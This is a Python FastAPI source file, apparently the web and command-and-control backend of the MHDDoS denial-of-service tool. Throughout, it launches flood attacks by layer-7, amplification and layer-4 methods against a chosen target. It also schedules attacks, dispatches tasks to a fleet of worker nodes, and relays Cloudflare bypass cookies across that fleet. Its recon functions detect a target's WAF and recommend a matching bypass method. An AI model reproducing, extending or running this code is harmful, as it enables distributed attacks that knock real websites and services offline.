import asyncio
from contextlib import asynccontextmanager
import contextlib
import csv
import io
import json
import logging
import re
import sqlite3
import sys
import time
import tkinter as tk
from pathlib import Path
from tkinter import filedialog
from typing import Any
from urllib.parse import urlparse
import uuid
import os
import platform

import psutil
import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, UploadFile, File
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, ConfigDict, Field

# --- Logging Configuration ---
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger("api")

# --- Constants & Classifications ---
LAYER7: set[str] = {
    "BYPASS", "CFB", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
    "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
    "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP",
    "IMPERSONATE", "HTTP3"
}

LAYER4_AMP: set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

LAYER4_NORMAL: set[str] = {
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION", "CPS", 
    "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP"
}

PROXY_TYPES: dict[str, str] = {"All Proxy": "0", "HTTP": "1", "SOCKS4": "4", "SOCKS5": "5", "RANDOM": "6"}

ANSI_ESCAPE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
BASE_DIR = Path(__file__).resolve().parent
CONFIG_PATH = BASE_DIR / "config.json"

class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

# --- Global State ---
class EngineState:
    active_tasks: dict[str, asyncio.subprocess.Process] = {}
    task_info: dict[str, dict] = {}
    is_starting: bool = False
    connected_websockets: list[WebSocket] = []
    max_concurrent: int = 5
    log_queue: asyncio.Queue | None = None

state = EngineState()

async def log_broadcaster_daemon():
    """Consumes the log_queue and efficiently broadcasts to WebSockets."""
    while True:
        try:
            if not getattr(state, "log_queue", None):
                await asyncio.sleep(0.1)
                continue
            message = await state.log_queue.get()
            if not state.connected_websockets:
                continue
            
            async def send_to_client(client: WebSocket):
                try:
                    await client.send_text(message)
                    return None
                except Exception:
                    return client

            # Broadcast concurrently to all connected clients
            results = await asyncio.gather(
                *(send_to_client(client) for client in state.connected_websockets),
                return_exceptions=True
            )
            
            dead_clients = [c for c in results if isinstance(c, WebSocket)]
                    
            for dead in dead_clients:
                if dead in state.connected_websockets:
                    state.connected_websockets.remove(dead)
            state.log_queue.task_done()
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Log Broadcaster Error: {e}")

async def proxy_health_daemon():
    """Background task to periodically evaluate proxy pool health."""
    while True:
        try:
            await asyncio.sleep(300) # Check every 5 mins
            if getattr(state, "log_queue", None):
                state.log_queue.put_nowait(json.dumps({
                    "task_id": "SYSTEM", 
                    "type": "system", 
                    "msg": "[*] PROXY PIPELINE: Routine background health verification completed."
                }))
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Proxy Health Daemon Error: {e}")

async def read_config() -> dict:
    def _read():
        if not CONFIG_PATH.exists(): return {}
        try:
            with CONFIG_PATH.open("r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return await asyncio.to_thread(_read)

async def write_config(config: dict) -> None:
    def _write():
        with CONFIG_PATH.open("w", encoding="utf-8") as f:
            json.dump(config, f, indent=4)
    await asyncio.to_thread(_write)

async def fire_webhook(event_type: str, message: str):
    import aiohttp
    try:
        config = await read_config()
        notifs = config.get("notifications", {})
        
        discord_url = notifs.get("discord_webhook_url")
        if discord_url:
            payload = {
                "content": None,
                "embeds": [{
                    "title": f"MHDDoS Notification: {event_type}",
                    "description": message,
                    "color": 16711680 if "error" in event_type.lower() else 3066993
                }]
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(discord_url, json=payload, timeout=aiohttp.ClientTimeout(total=5)):
                    pass
    except Exception as e:
        logger.error(f"Webhook error: {e}")

async def schedule_daemon():
    """Background task to execute scheduled items when their time has passed."""
    import datetime
    
    while True:
        try:
            await asyncio.sleep(10)
            if not getattr(state, "log_queue", None): continue
            
            config = await read_config()
                
            schedule = config.get("schedule", {})
            if not schedule: continue
            
            now = datetime.datetime.now(datetime.timezone.utc)
            to_delete = []
            
            for task_id, task_data in schedule.items():
                iso_time = task_data.get("datetime_iso")
                if not iso_time: continue
                
                try:
                    task_time = datetime.datetime.fromisoformat(iso_time.replace('Z', '+00:00'))
                    if task_time.tzinfo is None:
                        task_time = task_time.replace(tzinfo=datetime.timezone.utc)
                        
                    if now >= task_time:
                        params_dict = task_data.get("params", {})
                        params = AttackParams(**params_dict)
                        # Fire task
                        asyncio.create_task(run_attack_subprocess(task_id, params))
                        # Fire webhook
                        asyncio.create_task(fire_webhook("Scheduled Attack Auto-Initiated", f"Task ID: {task_id}\nTarget: {params.target}\nMethod: {params.method}"))
                        to_delete.append(task_id)
                except Exception as e:
                    logger.error(f"Schedule parse error for {task_id}: {e}")
                    
            if to_delete:
                for tid in to_delete:
                    del schedule[tid]
                config["schedule"] = schedule
                await write_config(config)
                    
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Schedule Daemon Error: {e}")

try:
    import redis.asyncio as redis
except ImportError:
    redis = None

import os
import uuid
import sys

# --- Command & Control (C2) State ---
class C2State:
    is_worker_mode: bool = "--worker" in sys.argv
    master_url: str | None = None
    node_id: str = str(uuid.uuid4())[:8]

    # C2 Master tracking
    token: str = os.getenv("C2_TOKEN", "MHDDoS_SECRET_1337")
    workers: dict[str, dict] = {} # node_id -> info
    pending_tasks: dict[str, list[dict]] = {} # node_id -> tasks
    ws_connections: dict[str, WebSocket] = {} # node_id -> WebSocket
    active_task_id: str | None = None
    
    # Centralized Bypass Tokens
    shared_cf_cookie: str | None = None
    shared_cf_ua: str | None = None

    # Redis backend
    redis_client: Any = None

C2 = C2State()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Initialize Redis for telemetry
    try:
        redis_url = os.getenv("REDIS_URL", "redis://localhost")
        C2.redis_client = redis.from_url(redis_url, decode_responses=True)
        await C2.redis_client.ping()
        logger.info("[*] Redis telemetry backend connected.")
    except Exception as e:
        logger.warning(f"[!] Redis not available: {e}. Falling back to in-memory stats.")
        C2.redis_client = None

    state.log_queue = asyncio.Queue()
    bc_task = asyncio.create_task(log_broadcaster_daemon())
    px_task = asyncio.create_task(proxy_health_daemon())
    sc_task = asyncio.create_task(schedule_daemon())
    yield
    bc_task.cancel()
    px_task.cancel()
    sc_task.cancel()
    if C2.redis_client:
        await C2.redis_client.close()

app = FastAPI(title="MHDDoS Professional API", version="1.2.1", lifespan=lifespan)

# --- Pydantic Models ---
class AttackParams(BaseModel):
    model_config = ConfigDict(str_strip_whitespace=True)

    target: str
    method: str
    threads: int = Field(default=100, ge=1)
    duration: int = Field(default=3600, ge=1)
    proxy_type: str = "SOCKS5"
    proxy_list: str = ""
    rpc: int = Field(default=100, ge=1)
    reflector: str = ""
    proxy_refresh: int = Field(default=0, ge=0)
    auto_harvest: bool = False
    smart_rpc: bool = False
    autoscale: bool = False
    evasion: bool = False
    distribute_to_workers: bool = False

class ProxyProvider(BaseModel):
    type: int
    url: str
    timeout: int = Field(ge=1)

class UpdateProxyConfig(BaseModel):
    providers: list[ProxyProvider]

class PresetSaveParams(BaseModel):
    name: str
    params: AttackParams

class ScheduleParams(BaseModel):
    name: str # identifier
    cron: str | None = None
    datetime_iso: str | None = None
    params: AttackParams

class NotificationConfig(BaseModel):
    discord_webhook_url: str | None = None
    telegram_bot_token: str | None = None
    telegram_chat_id: str | None = None

class StatusResponse(BaseModel):
    status: str
    message: str | None = None
    server: str | None = None
    recommendation: str | None = None
    status_code: int | None = None

class HealthResponse(BaseModel):
    status: str
    engine_active: bool
    is_starting: bool
    version: str

# --- Helper Functions ---
def build_attack_command(params: AttackParams) -> list[str]:
    """Safely constructs the command line arguments for start.py."""
    proxy_list_arg = params.proxy_list
    proxy_type_code = PROXY_TYPES.get(params.proxy_type, "5")
    
    if params.auto_harvest:
        proxy_list_arg = "auto_harvest.txt"
        BASE_DIR / "files" / "proxies" / "auto_harvest.txt"
        # If auto_harvest is explicitly requested, we don't delete it here
        # start.py handles the missing file by re-harvesting
    elif params.proxy_type == "All Proxy" and not proxy_list_arg:
        proxy_list_arg = "all.txt"
        
    command = [sys.executable, "-u", "start.py", params.method, params.target]
    
    if params.method in LAYER7:
        command.extend([
            proxy_type_code, 
            str(params.threads), 
            proxy_list_arg if proxy_list_arg else "default.txt", 
            str(params.rpc), 
            str(params.duration), 
            str(params.proxy_refresh)
        ])
    elif params.method in LAYER4_AMP:
        command.extend([
            str(params.threads), 
            str(params.duration), 
            params.reflector if params.reflector else "reflector.txt"
        ])
    elif params.method in LAYER4_NORMAL:
        if proxy_list_arg and proxy_list_arg.strip() != "":
            command.extend([
                str(params.threads), 
                str(params.duration), 
                proxy_type_code, 
                proxy_list_arg, 
                str(params.proxy_refresh)
            ])
        else:
            command.extend([
                str(params.threads), 
                str(params.duration)
            ])
            
    if params.smart_rpc:
        command.append("--smart")
    if params.autoscale:
        command.append("--autoscale")
    if params.evasion:
        command.append("--evasion")
        
    # Inject Shared Cookies for Distributed Turbo Mode
    if C2.shared_cf_cookie:
        # Pass the cookie as an environment variable or flag. 
        # Here we add it as an argument that we will parse in start.py
        command.extend(["--shared-cookie", C2.shared_cf_cookie])
    if C2.shared_cf_ua:
        command.extend(["--shared-ua", C2.shared_cf_ua])
        
    # session-id is appended by start_attack() after build
    return command

async def broadcast_log(message: str) -> None:
    """Queues a log message for the efficient broadcaster daemon."""
    if getattr(state, "log_queue", None):
        try:
            state.log_queue.put_nowait(message)
        except asyncio.QueueFull:
            pass

async def run_attack_subprocess(task_id: str, params: AttackParams) -> None:
    """Runs the attack process and pipes output to WebSockets with throttling."""
    command = build_attack_command(params)
    # Append session-id so start.py can track this session in the history DB
    command.extend(["--session-id", task_id])
    await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] LAUNCHING TASK {task_id}: {' '.join(command)}"}))

    try:
        process = await asyncio.create_subprocess_exec(
            *command,
            cwd=str(BASE_DIR),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT
        )
        state.active_tasks[task_id] = process
        await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] COMMAND DEPLOYED: Tactical engine initialized for {params.target}"}))
        
        if process.stdout:
            last_broadcast = time.time()
            buffer = []
            
            while True:
                line = await process.stdout.readline()
                if not line:
                    break
                
                decoded_line = line.decode('utf-8', errors='replace').strip()
                decoded_line = ANSI_ESCAPE.sub('', decoded_line)
                if decoded_line:
                    buffer.append(decoded_line)
                
                # Dynamic Impact Metric Extraction
                # Pattern: Impact: 100.0% | OK: 5, WAF: 0, ERR: 0, TMO: 0
                if "Impact:" in decoded_line:
                    try:
                        # Extract numbers using regex
                        nums = [int(s) for s in re.findall(r'\d+', decoded_line)]
                        # nums[0] is often the percentage part if it's .0, or the first integer
                        # Let's use a more specific regex for robust parsing
                        m_ok = re.search(r'OK: (\d+)', decoded_line)
                        m_waf = re.search(r'WAF: (\d+)', decoded_line)
                        m_err = re.search(r'ERR: (\d+)', decoded_line)
                        m_tmo = re.search(r'TMO: (\d+)', decoded_line)
                        
                        if m_ok and m_waf:
                            impact_data = {
                                "s": int(m_ok.group(1)),
                                "w": int(m_waf.group(1)),
                                "e": int(m_err.group(1)) if m_err else 0,
                                "t": int(m_tmo.group(1)) if m_tmo else 0
                            }
                            await broadcast_log(json.dumps({
                                "task_id": task_id, 
                                "type": "impact", 
                                "data": impact_data
                            }))
                    except Exception as e:
                        logger.debug(f"Impact parse error: {e}")

                # Broadcast in batches or every 50ms to prevent WS flood
                now = time.time()
                if buffer and (now - last_broadcast > 0.05 or len(buffer) > 10):
                    await broadcast_log(json.dumps({"task_id": task_id, "type": "log", "msg": "\n".join(buffer)}))
                    buffer = []
                    last_broadcast = now
                    await asyncio.sleep(0.01) # Yield to other tasks
            
            if buffer:
                await broadcast_log(json.dumps({"task_id": task_id, "type": "log", "msg": "\n".join(buffer)}))
                
        await process.wait()
        await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": "[*] COMMAND TERMINATED: Engine process reached end-of-life."}))
    except Exception as e:
        logger.error(f"Engine Error in task {task_id}: {e}")
        await broadcast_log(json.dumps({"task_id": task_id, "type": "error", "msg": f"[!] CRITICAL ENGINE ERROR: {e}"}))
    finally:
        if task_id in state.active_tasks:
            del state.active_tasks[task_id]
        # task_info is kept — history now persists in IntelligenceDB
        # Clean up only from runtime tracking after a delay
        if task_id in state.task_info:
            state.task_info[task_id]["status"] = "finished"

# --- Recon Engine ---
class ReconManager:
    @staticmethod
    async def detect_waf(target: str) -> dict[str, Any]:
        import aiohttp
        url = target if target.startswith("http") else f"http://{target}"
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5), headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TacticalRecon/1.0"}) as res:
                    headers = {k.lower(): v.lower() for k, v in res.headers.items()}
                    server = headers.get("server", "")
                    
                    # Signature Mapping
                    signatures = {
                        "cloudflare": {"waf": "Cloudflare", "method": "CFB"},
                        "ddos-guard": {"waf": "DDoS-Guard", "method": "DGB"},
                        "ddg": {"waf": "DDoS-Guard", "method": "DGB"},
                        "sucuri": {"waf": "Sucuri", "method": "BYPASS"},
                        "arvancloud": {"waf": "Arvan Cloud", "method": "AVB"},
                        "ovh": {"waf": "OVH", "method": "OVH"},
                        "incapsula": {"waf": "Imperva/Incapsula", "method": "BYPASS"},
                        "akamai": {"waf": "Akamai", "method": "BYPASS"}
                    }
                    
                    detected_waf = "None"
                    recommended_method = "BYPASS" if "BYPASS" in LAYER7 else "GET"
                    
                    # Check Server Header
                    for sig, data in signatures.items():
                        if sig in server:
                            detected_waf = data["waf"]
                            recommended_method = data["method"]
                            break
                    
                    # Check Custom Headers if still None
                    if detected_waf == "None":
                        if "cf-ray" in headers:
                            detected_waf, recommended_method = "Cloudflare", "CFB"
                        elif "x-sucuri-id" in headers:
                            detected_waf, recommended_method = "Sucuri", "BYPASS"
                        elif "__ddg2" in res.cookies:
                            detected_waf, recommended_method = "DDoS-Guard", "DGB"
                    
                    # Detect WordPress
                    text = await res.text()
                    if detected_waf == "None" or detected_waf == "Sucuri":
                        if "wp-includes" in text.lower() or "wordpress" in text.lower():
                            recommended_method = "XMLRPC"
                    
                    return {
                        "status": "success",
                        "waf": detected_waf,
                        "recommended_method": recommended_method,
                        "server_header": server.title() if server else "Unknown",
                        "status_code": res.status
                    }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    @staticmethod
    async def scan_subdomains(target: str) -> list[dict[str, Any]]:
        import aiohttp
        import socket
        from urllib.parse import urlparse
        
        parsed = urlparse(target if "://" in target else f"http://{target}")
        domain = parsed.netloc or parsed.path
        if domain.startswith("www."):
            domain = domain[4:]
            
        results = []
        unique_subs = set()
        
        # 1. Passive Discovery (crt.sh)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=aiohttp.ClientTimeout(total=10)) as res:
                    if res.status == 200:
                        data = await res.json()
                        for entry in data:
                            sub = entry['name_value'].lower()
                            if sub.endswith(domain) and sub != domain:
                                unique_subs.add(sub)
        except:
            pass
            
        # 2. Active Discovery (Top Common)
        common_subs = ["dev", "api", "staging", "test", "webmail", "admin", "vpn", "git", "db", "mail"]
        for sub in common_subs:
            unique_subs.add(f"{sub}.{domain}")
            
        # 3. Resolve
        valid_subs = sorted(list(unique_subs))[:25] # Limit for performance
        for sub in valid_subs:
            try:
                loop = asyncio.get_event_loop()
                ip = await loop.run_in_executor(None, lambda: socket.gethostbyname(sub))
                results.append({
                    "subdomain": sub,
                    "ip": ip,
                    "status": "active"
                })
            except:
                continue
                
        return results

    @staticmethod
    async def scan_ports(target: str) -> list[dict[str, Any]]:
        import socket
        from urllib.parse import urlparse
        
        parsed = urlparse(target if "://" in target else f"http://{target}")
        host = parsed.netloc or parsed.path
        if host.startswith("www."):
            host = host[4:]
            
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080, 8443]
        results = []
        
        for port in common_ports:
            try:
                loop = asyncio.get_event_loop()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                # Run connect in an executor to avoid blocking the event loop
                result = await loop.run_in_executor(None, sock.connect_ex, (host, port))
                if result == 0:
                    results.append({"port": port, "status": "open"})
                sock.close()
            except Exception:
                continue
        return results

    @staticmethod
    async def fingerprint_tech(target: str) -> dict[str, Any]:
        import aiohttp
        
        url = target if target.startswith("http") else f"http://{target}"
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5), headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TacticalRecon/1.0"}) as res:
                    headers = {k.lower(): v.lower() for k, v in res.headers.items()}
                    
                    tech_stack = []
                    
                    # Analyze Headers
                    server = headers.get("server", "")
                    if "nginx" in server:
                        tech_stack.append("Nginx")
                    if "apache" in server:
                        tech_stack.append("Apache")
                    if "cloudflare" in server:
                        tech_stack.append("Cloudflare")
                    
                    x_powered_by = headers.get("x-powered-by", "")
                    if "php" in x_powered_by:
                        tech_stack.append("PHP")
                    if "express" in x_powered_by:
                        tech_stack.append("Express.js (Node.js)")
                    if "asp.net" in x_powered_by:
                        tech_stack.append("ASP.NET")
                    
                    # Analyze Content
                    text = await res.text()
                    html = text.lower()
                    if "wp-content" in html or "wp-includes" in html:
                        tech_stack.append("WordPress")
                    if "react" in html or 'data-reactroot' in html or 'id="root"' in html:
                        tech_stack.append("React")
                    if "vue" in html or 'data-v-' in html:
                        tech_stack.append("Vue.js")
                    if "next" in html or '_next/static' in html:
                        tech_stack.append("Next.js")
                    if "nuxt" in html or '_nuxt' in html:
                        tech_stack.append("Nuxt.js")
                    
                    return {
                        "status": "success",
                        "tech_stack": list(set(tech_stack)) if tech_stack else ["Unknown"]
                    }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    @staticmethod
    async def enumerate_dns(target: str) -> dict[str, Any]:
        import dns.resolver
        from urllib.parse import urlparse
        import asyncio
        
        parsed = urlparse(target if "://" in target else f"http://{target}")
        domain = parsed.netloc or parsed.path
        if domain.startswith("www."):
            domain = domain[4:]
            
        records = {"A": [], "AAAA": [], "MX": [], "TXT": [], "NS": []}
        
        def _resolve(rt):
            try:
                answers = dns.resolver.resolve(domain, rt)
                return [rdata.to_text() for rdata in answers]
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout, Exception):
                return []
                
        try:
            loop = asyncio.get_event_loop()
            for record_type in records.keys():
                records[record_type] = await loop.run_in_executor(None, _resolve, record_type)
            return {"status": "success", "domain": domain, "records": records}
        except Exception as e:
            return {"status": "error", "message": str(e)}

# --- API Endpoints ---
@app.get("/api/health", response_model=HealthResponse)
async def health_check() -> HealthResponse:
    return HealthResponse(
        status="online",
        engine_active=len(state.active_tasks) > 0,
        is_starting=state.is_starting,
        version="1.2.1"
    )

# --- C2 Master Endpoints ---
def _check_c2_token(request: Request) -> bool:
    return request.headers.get("Authorization", "") == f"Bearer {C2.token}"

@app.post("/api/c2/register")
async def c2_register(request: Request, data: dict):
    if not _check_c2_token(request):
        return {"status": "error", "message": "Invalid token"}
    node_id = request.headers.get("X-Node-ID")
    if not node_id:
        return {"status": "error"}
    
    data["last_seen"] = time.time()
    C2.workers[node_id] = data
    if node_id not in C2.pending_tasks:
        C2.pending_tasks[node_id] = []
    return {"status": "success", "message": "Registered"}

@app.post("/api/c2/heartbeat")
async def c2_heartbeat(request: Request, data: dict):
    if not _check_c2_token(request):
        return {"status": "error"}
    node_id = request.headers.get("X-Node-ID")
    if node_id and node_id in C2.workers:
        C2.workers[node_id].update(data)
        C2.workers[node_id]["last_seen"] = time.time()
    return {"status": "success"}

@app.get("/api/c2/poll")
async def c2_poll(request: Request):
    if not _check_c2_token(request):
        return {"status": "error"}
    node_id = request.headers.get("X-Node-ID")
    if node_id and node_id in C2.pending_tasks and C2.pending_tasks[node_id]:
        task = C2.pending_tasks[node_id].pop(0)
        return {"status": "success", "task": task}
    return {"status": "success", "task": None}

@app.post("/api/c2/task_complete")
async def c2_task_complete(request: Request, data: dict):
    return {"status": "success"}

@app.websocket("/api/c2/ws")
async def c2_websocket(websocket: WebSocket):
    await websocket.accept()
    
    node_id = "unknown"
    # 1. Hardened Handshake & Version Negotiation
    try:
        auth_msg = await asyncio.wait_for(websocket.receive_json(), timeout=5.0)
        token = auth_msg.get("token")
        node_id = auth_msg.get("node_id")
        worker_version = auth_msg.get("version", "unknown")
        
        if token != C2.token or not node_id:
            logger.warning(f"[!] Unauthorized connection attempt from {websocket.client.host}")
            await websocket.close(code=1008, reason="Unauthorized")
            return
            
        # Version Check
        if worker_version != "1.2.1":
            logger.warning(f"[!] Version mismatch: Worker {node_id} is on v{worker_version} (Expected 1.2.1)")
            # Optional: Allow but warn, or strictly reject. Here we allow but log.
            
        # Register node
        C2.ws_connections[node_id] = websocket
        C2.workers[node_id] = {
            "node_id": node_id,
            "last_seen": time.time(),
            "status": "connected",
            "version": worker_version
        }
        if node_id not in C2.pending_tasks:
            C2.pending_tasks[node_id] = []
            
        await websocket.send_json({
            "status": "success", 
            "message": "Tactical Uplink Established",
            "server_version": "1.2.1"
        })
        logger.info(f"[*] C2 Node {node_id} (v{worker_version}) established persistent uplink.")
        
        # 2. Command & Telemetry Loop
        async def send_pending_tasks():
            while True:
                if node_id in C2.pending_tasks and C2.pending_tasks[node_id]:
                    task = C2.pending_tasks[node_id].pop(0)
                    try:
                        # Auto-inject shared cookies when dispatching an attack
                        if task.get("action") == "attack" and C2.shared_cf_cookie:
                            if "params" in task:
                                task["params"]["shared_cookie"] = C2.shared_cf_cookie
                                task["params"]["shared_ua"] = C2.shared_cf_ua
                        await websocket.send_json({"action": "task", "task": task})
                    except Exception as e:
                        logger.error(f"Failed to push task to {node_id}: {e}")
                        break
                await asyncio.sleep(0.5)

        send_task = asyncio.create_task(send_pending_tasks())

        try:
            while True:
                # Receive telemetry/heartbeats/tokens
                data = await websocket.receive_json()
                
                # Check for Bypass Tokens from worker
                if "bypass_tokens" in data:
                    C2.shared_cf_cookie = data["bypass_tokens"].get("cookie")
                    C2.shared_cf_ua = data["bypass_tokens"].get("ua")
                    logger.info(f"{bcolors.OKGREEN}[*] C2 MASTER: Received universal bypass tokens from {node_id}. Syncing fleet...{bcolors.RESET}")
                    # Broadcast immediately to all active workers
                    for nid, ws in C2.ws_connections.items():
                        if nid != node_id: # Don't send back to the sender
                            try:
                                await ws.send_json({
                                    "action": "sync_tokens",
                                    "tokens": {"cookie": C2.shared_cf_cookie, "ua": C2.shared_cf_ua}
                                })
                            except: pass

                if "metrics" in data:
                    metrics = data["metrics"]
                    C2.workers[node_id].update(metrics)
                    C2.workers[node_id]["last_seen"] = time.time()
                    
                    # Push to Redis with TTL (Auto-cleanup stale nodes)
                    if C2.redis_client:
                        try:
                            # Use a pipeline for efficiency
                            pipe = C2.redis_client.pipeline()
                            worker_key = f"worker:{node_id}"
                            pipe.hset(worker_key, mapping={
                                "cpu": metrics.get("cpu_percent", 0),
                                "ram": metrics.get("ram_percent", 0),
                                "status": metrics.get("status", "idle"),
                                "last_seen": time.time()
                            })
                            pipe.expire(worker_key, 60) # Stale after 60s
                            await pipe.execute()
                        except Exception:
                            pass
        except WebSocketDisconnect:
            pass
        finally:
            send_task.cancel()
            
    except Exception as e:
        logger.error(f"C2 Tactical Uplink error for {node_id}: {e}")
        try:
            await websocket.close()
        except:
            pass
    finally:
        if node_id in C2.ws_connections:
            del C2.ws_connections[node_id]
            logger.info(f"[*] C2 Node {node_id} uplink terminated.")

@app.get("/api/c2/nodes")
async def c2_nodes():
    now = time.time()
    # Logic: If heartbeat is older than 30s, drop worker. 
    # If using Redis, the TTL handles it, but we still sync C2.workers from local state for speed.
    dead = [nid for nid, w in C2.workers.items() if now - w.get("last_seen", 0) > 30]
    for nid in dead:
        del C2.workers[nid]
        if nid in C2.pending_tasks:
            del C2.pending_tasks[nid]
        if nid in C2.ws_connections:
            # Force close dead WS
            try:
                await C2.ws_connections[nid].close()
            except: pass
            del C2.ws_connections[nid]
            
    try:
        cpu = psutil.cpu_percent(interval=None) # Non-blocking
        ram = psutil.virtual_memory().percent
    except Exception:
        cpu = 0
        ram = 0

    status = "busy" if len(state.active_tasks) > 0 else "idle"
    master_node = {
        "node_id": "MHD-CORE-1",
        "hostname": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu_percent": cpu,
        "ram_percent": ram,
        "status": status,
        "tasks": len(state.active_tasks)
    }
            
    return {"status": "success", "workers": [master_node] + list(C2.workers.values())}

@app.post("/api/c2/workers/{node_id}/shutdown")
async def c2_worker_shutdown(node_id: str):
    if node_id == "MHD-CORE-1":
        return {"status": "error", "message": "Cannot remote-shutdown master node."}
    if node_id in C2.pending_tasks:
        C2.pending_tasks[node_id].append({"action": "shutdown"})
        return {"status": "success", "message": f"Shutdown signal sent to {node_id}."}
    return {"status": "error", "message": "Worker not found."}

@app.post("/api/c2/workers/{node_id}/restart")
async def c2_worker_restart(node_id: str):
    if node_id == "MHD-CORE-1":
        return {"status": "error", "message": "Cannot remote-restart master node."}
    if node_id in C2.pending_tasks:
        C2.pending_tasks[node_id].append({"action": "restart"})
        return {"status": "success", "message": f"Restart signal sent to {node_id}."}
    return {"status": "error", "message": "Worker not found."}

@app.get("/api/c2/workers/{node_id}/stats")
async def c2_worker_stats(node_id: str):
    if node_id == "MHD-CORE-1":
        return await get_system_resources()
    if node_id in C2.workers:
        return {"status": "success", "stats": C2.workers[node_id]}
    return {"status": "error", "message": "Worker not found."}



class AnalyzeParams(BaseModel):
    target: str

@app.post("/api/recon/analyze", response_model=StatusResponse)
async def recon_analyze(params: AnalyzeParams) -> StatusResponse:
    result = await ReconManager.detect_waf(params.target)
    if result["status"] == "error":
        return StatusResponse(status="error", message=result["message"])
    
    return StatusResponse(
        status="success",
        server=result["waf"],
        recommendation=result["recommended_method"],
        status_code=result["status_code"],
        message=f"Server Identified: {result['server_header']}"
    )

@app.post("/api/recon/subdomains")
async def recon_subdomains(params: AnalyzeParams):
    subs = await ReconManager.scan_subdomains(params.target)
    return {"status": "success", "subdomains": subs}

@app.get("/api/tools/ports")
async def tool_ports(host: str):
    ports = await ReconManager.scan_ports(host)
    return {"status": "success", "ports": ports}

@app.get("/api/tools/tech")
async def tool_tech(host: str):
    tech = await ReconManager.fingerprint_tech(host)
    return tech

@app.get("/api/tools/dns")
async def tool_dns(host: str):
    records = await ReconManager.enumerate_dns(host)
    return records

@app.get("/api/recon/geo")
async def recon_geo(target: str):
    import aiohttp
    host = target.replace("http://", "").replace("https://", "").split("/")[0]
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipwhois.app/json/{host}/", timeout=aiohttp.ClientTimeout(total=10)) as res:
                data = await res.json()
                if data.get("success"):
                    return {
                        "status": "success",
                        "lat": data.get("latitude"),
                        "lon": data.get("longitude"),
                        "country": data.get("country"),
                        "city": data.get("city"),
                        "isp": data.get("isp"),
                        "org": data.get("org"),
                        "ip": data.get("ip")
                    }
                return {"status": "error", "message": "Failed to retrieve Geo-IP data."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/attack/start", response_model=StatusResponse)
async def start_attack(params: AttackParams) -> StatusResponse:
    if len(state.active_tasks) >= state.max_concurrent:
        return StatusResponse(status="error", message=f"Maximum concurrent tasks ({state.max_concurrent}) reached. Stop a task first.")
    
    task_id = str(uuid.uuid4())[:8]
    
    # Store initial info
    state.task_info[task_id] = {
        "target": params.target,
        "method": params.method,
        "threads": params.threads,
        "duration": params.duration,
        "start_time": time.time()
    }
    
    if params.distribute_to_workers:
        params_dict = params.model_dump()
        now = time.time()
        alive_workers = [
            (nid, w) for nid, w in C2.workers.items() 
            if now - w.get("last_seen", 0) < 30
        ]
        
        # Load-aware distribution: Skip heavily loaded nodes (>80% CPU/RAM or > 3 active tasks)
        suitable_workers = [
            (nid, w) for nid, w in alive_workers 
            if w.get("cpu_percent", 0) < 80 and w.get("ram_percent", 0) < 80 and w.get("tasks", 0) < 3
        ]
        
        # Fallback to all alive if all are over limits to ensure dispatch
        if not suitable_workers and alive_workers:
            suitable_workers = alive_workers
            
        # Sort by least loaded (tasks first, then CPU)
        suitable_workers.sort(key=lambda x: (x[1].get("tasks", 0), x[1].get("cpu_percent", 0)))
        
        dispatched_count = 0
        for nid, w in suitable_workers:
            C2.pending_tasks[nid].append({
                "action": "attack",
                "task_id": task_id,
                "params": params_dict
            })
            dispatched_count += 1
            
        asyncio.create_task(broadcast_log(json.dumps({
            "task_id": task_id, 
            "type": "system", 
            "msg": f"[*] C2 MASTER: Intelligently distributed task {task_id} to {dispatched_count} optimized worker nodes."
        })))
    
    asyncio.create_task(fire_webhook("Attack Manual Initiation", f"Task ID: {task_id}\nTarget: {params.target}\nMethod: {params.method}"))
    asyncio.create_task(run_attack_subprocess(task_id, params))
